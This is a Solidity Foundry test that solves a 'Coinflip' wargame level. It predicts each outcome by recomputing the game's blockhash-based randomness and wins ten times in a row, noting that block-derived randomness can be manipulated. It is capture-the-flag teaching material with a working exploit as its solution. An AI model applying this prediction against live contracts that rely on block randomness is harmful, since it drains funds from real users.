// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Coinflip.sol";

/// @custom:win-condition 
// This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip.
// To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

/// @custom:lesson-learned
// on-chain randomness using blocks and timestamps can be manipulated

contract CoinflipSolvedTest is Test {

  Coinflip public s_coinflip;
  address payable s_user;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function setUp() public {
    s_coinflip = new Coinflip();
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
    vm.roll(1);
  }

  function testWinCondition() public {
    vm.startPrank(s_user);

    for(uint256 i; i < 10; i++) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        s_coinflip.flip(side);
        vm.roll(block.number + 1);
    }
    assertEq(s_coinflip.consecutiveWins(), 10);
  }
 
}